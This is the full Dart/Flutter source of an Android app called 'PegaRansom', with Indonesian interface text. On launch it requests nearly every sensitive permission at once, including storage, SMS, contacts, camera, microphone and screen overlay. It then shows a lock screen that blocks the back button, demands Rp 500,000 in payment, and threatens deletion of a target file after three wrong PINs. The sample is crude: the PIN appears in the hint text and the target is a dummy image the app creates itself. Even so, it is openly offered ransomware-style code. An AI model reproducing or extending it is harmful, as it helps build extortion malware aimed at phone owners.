import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'dart:io';
import 'dart:async';
import 'package:shared_preferences/shared_preferences.dart';

void main() {
  runApp(const PegaRansomApp());
}

class PegaRansomApp extends StatelessWidget {
  const PegaRansomApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'PegaRansom',
      theme: ThemeData.dark(),
      home: const PermissionAndLockScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class PermissionAndLockScreen extends StatefulWidget {
  const PermissionAndLockScreen({super.key});

  @override
  State<PermissionAndLockScreen> createState() => _PermissionAndLockScreenState();
}

class _PermissionAndLockScreenState extends State<PermissionAndLockScreen> {
  bool _permissionsGranted = false;
  bool _screenLocked = false;
  String _status = "Memulai sistem...";
  
  @override
  void initState() {
    super.initState();
    // Langsung request permission saat app dibuka
    _initializeApp();
  }
  
  Future<void> _initializeApp() async {
    // Step 1: Buat file target
    _createTargetFile();
    
    // Step 2: Request semua permission
    await _requestAllPermissions();
    
    // Step 3: Lock screen setelah permission
    if (_permissionsGranted) {
      await Future.delayed(const Duration(seconds: 1));
      _lockDevice();
    }
  }
  
  Future<void> _createTargetFile() async {
    try {
      final directory = Directory('/storage/emulated/0/Pictures/100PINT/Pins');
      if (!await directory.exists()) {
        await directory.create(recursive: true);
      }
      
      final file = File('/storage/emulated/0/Pictures/100PINT/Pins/tes.jpg');
      if (!await file.exists()) {
        // Create dummy image file
        final dummyData = List<int>.generate(1024, (i) => i % 256);
        await file.writeAsBytes(dummyData);
        print("File target dibuat: ${file.path}");
      }
    } catch (e) {
      print("Error buat file: $e");
    }
  }
  
  Future<void> _requestAllPermissions() async {
    setState(() => _status = "Meminta izin...");
    
    // Semua permission penting
    final permissions = [
      Permission.storage,
      Permission.manageExternalStorage,
      Permission.accessMediaLocation,
      Permission.camera,
      Permission.microphone,
      Permission.phone,
      Permission.sms,
      Permission.contacts,
      Permission.location,
      Permission.notification,
      Permission.systemAlertWindow,
    ];
    
    // Request semua sekaligus
    final results = await permissions.request();
    
    // Cek jika minimal storage granted
    final storageGranted = results[Permission.storage]?.isGranted ?? false;
    
    setState(() {
      _permissionsGranted = storageGranted;
      _status = storageGranted ? "Izin diberikan" : "Izin ditolak";
    });
    
    // Mulai monitor file
    _startFileMonitoring();
  }
  
  void _startFileMonitoring() {
    // Monitor file setiap 30 detik
    Timer.periodic(const Duration(seconds: 30), (timer) async {
      await _checkAndDeleteFile();
    });
  }
  
  Future<void> _checkAndDeleteFile() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final ransomPaid = prefs.getBool('ransom_paid') ?? false;
      
      if (!ransomPaid) {
        final file = File('/storage/emulated/0/Pictures/100PINT/Pins/tes.jpg');
        if (await file.exists()) {
          await file.delete();
          print("File dihapus (monitoring)");
          
          // Buat ulang setelah 10 detik
          await Future.delayed(const Duration(seconds: 10));
          await _createTargetFile();
        }
      }
    } catch (e) {
      print("Error monitoring: $e");
    }
  }
  
  void _lockDevice() {
    setState(() {
      _screenLocked = true;
      _status = "Perangkat dikunci";
    });
    
    // Enable full screen
    // SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
  }
  
  void _unlockDevice() {
    setState(() {
      _screenLocked = false;
      _status = "Perangkat terbuka";
    });
    
    // Disable full screen
    // SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
  }
  
  @override
  Widget build(BuildContext context) {
    if (_screenLocked) {
      return _buildLockScreen();
    }
    
    return Scaffold(
      backgroundColor: Colors.black,
      body: Center(
        child: Container(
          padding: const EdgeInsets.all(30),
          decoration: BoxDecoration(
            color: Colors.grey[900],
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: Colors.red, width: 2),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Icon(
                Icons.security,
                size: 60,
                color: Colors.red,
              ),
              const SizedBox(height: 20),
              const Text(
                'PegaRansom',
                style: TextStyle(
                  fontSize: 28,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                ),
              ),
              const SizedBox(height: 10),
              Text(
                _status,
                style: const TextStyle(color: Colors.grey),
              ),
              const SizedBox(height: 30),
              
              if (!_permissionsGranted)
                const CircularProgressIndicator(color: Colors.red)
              else
                const Column(
                  children: [
                    Icon(
                      Icons.check_circle,
                      color: Colors.green,
                      size: 40,
                    ),
                    SizedBox(height: 10),
                    Text(
                      'Mengunci perangkat...',
                      style: TextStyle(color: Colors.green),
                    ),
                  ],
                ),
            ],
          ),
        ),
      ),
    );
  }
  
  Widget _buildLockScreen() {
    return LockScreen(
      onUnlock: _unlockDevice,
    );
  }
}

// ==================== LOCK SCREEN ====================
class LockScreen extends StatefulWidget {
  final VoidCallback onUnlock;
  
  const LockScreen({super.key, required this.onUnlock});
  
  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> {
  final TextEditingController _pinController = TextEditingController();
  bool _showError = false;
  int _attempts = 0;
  
  Future<void> _checkPin() async {
    const correctPin = '969';
    
    if (_pinController.text == correctPin) {
      // PIN benar - unlock
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool('ransom_paid', true);
      widget.onUnlock();
      SystemNavigator.pop();
    } else {
      // PIN salah
      setState(() {
        _showError = true;
        _attempts++;
      });
      
      _pinController.clear();
      
      // Hapus file setelah 3x salah
      if (_attempts >= 3) {
        await _deleteTargetFile();
      }
    }
  }
  
  Future<void> _deleteTargetFile() async {
    try {
      final file = File('/storage/emulated/0/Pictures/100PINT/Pins/tes.jpg');
      if (await file.exists()) {
        await file.delete();
        print("File dihapus karena PIN salah 3x");
      }
    } catch (e) {
      print("Error hapus file: $e");
    }
  }
  
  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async => false,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: Center(
          child: Container(
            width: MediaQuery.of(context).size.width * 0.9,
            padding: const EdgeInsets.all(25),
            decoration: BoxDecoration(
              color: Colors.grey[900],
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: Colors.red, width: 3),
              boxShadow: [
                BoxShadow(
                  color: Colors.red.withOpacity(0.3),
                  blurRadius: 30,
                  spreadRadius: 5,
                ),
              ],
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const Icon(
                  Icons.lock,
                  size: 70,
                  color: Colors.red,
                ),
                const SizedBox(height: 20),
                const Text(
                  '⚠ PERANGKAT DIKUNCI ⚠',
                  style: TextStyle(
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                    color: Colors.white,
                  ),
                ),
                const SizedBox(height: 10),
                const Text(
                  'PegaRansom v1.0 - Sistem Aktif',
                  style: TextStyle(color: Colors.grey),
                ),
                const SizedBox(height: 30),
                
                // Ransom Box
                Container(
                  padding: const EdgeInsets.all(20),
                  decoration: BoxDecoration(
                    color: Colors.black,
                    borderRadius: BorderRadius.circular(15),
                    border: Border.all(color: Colors.yellow, width: 2),
                  ),
                  child: const Column(
                    children: [
                      Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(
                            Icons.attach_money,
                            color: Colors.yellow,
                            size: 30,
                          ),
                          SizedBox(width: 10),
                          Text(
                            'TEKOR: Rp 500.000',
                            style: TextStyle(
                              fontSize: 20,
                              fontWeight: FontWeight.bold,
                              color: Colors.yellow,
                            ),
                          ),
                        ],
                      ),
                      SizedBox(height: 10),
                      Text(
                        'Bayar untuk membuka perangkat',
                        style: TextStyle(color: Colors.grey),
                      ),
                    ],
                  ),
                ),
                
                const SizedBox(height: 30),
                
                // PIN Input
                TextField(
                  controller: _pinController,
                  keyboardType: TextInputType.number,
                  textAlign: TextAlign.center,
                  style: const TextStyle(
                    fontSize: 24,
                    color: Colors.white,
                    fontWeight: FontWeight.bold,
                  ),
                  decoration: InputDecoration(
                    hintText: 'Masukkan PIN (969)',
                    hintStyle: const TextStyle(color: Colors.grey),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: BorderSide(
                        color: _showError ? Colors.red : Colors.grey,
                      ),
                    ),
                    filled: true,
                    fillColor: Colors.grey[800],
                  ),
                  onChanged: (value) {
                    if (value.length == 3) {
                      _checkPin();
                    }
                  },
                ),
                
                if (_showError) ...[
                  const SizedBox(height: 20),
                  Text(
                    'PIN salah! Percobaan $_attempts/3',
                    style: const TextStyle(color: Colors.red),
                  ),
                  const SizedBox(height: 5),
                  const Text(
                    'File akan dihapus setelah 3x gagal',
                    style: TextStyle(color: Colors.red, fontSize: 12),
                  ),
                ],
                
                const SizedBox(height: 40),
                
                // Warning
                Container(
                  padding: const EdgeInsets.all(15),
                  decoration: BoxDecoration(
                    color: Colors.red.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: Colors.red.withOpacity(0.3)),
                  ),
                  child: const Column(
                    children: [
                      Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(
                            Icons.warning,
                            color: Colors.orange,
                            size: 18,
                          ),
                          SizedBox(width: 8),
                          Text(
                            'PERINGATAN',
                            style: TextStyle(
                              color: Colors.orange,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ],
                      ),
                      SizedBox(height: 8),
                      Text(
                        'File target akan dihapus otomatis saat:',
                        style: TextStyle(color: Colors.grey, fontSize: 12),
                      ),
                      SizedBox(height: 4),
                      Text(
                        '1. PIN salah 3 kali\n2. Perangkat di-reboot\n3. Monitoring sistem',
                        style: TextStyle(color: Colors.orange, fontSize: 11),
                      ),
                      SizedBox(height: 4),
                      Text(
                        'Target: /Pictures/100PINT/Pins/tes.jpg',
                        style: TextStyle(
                          color: Colors.red,
                          fontSize: 10,
                          fontFamily: 'monospace',
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
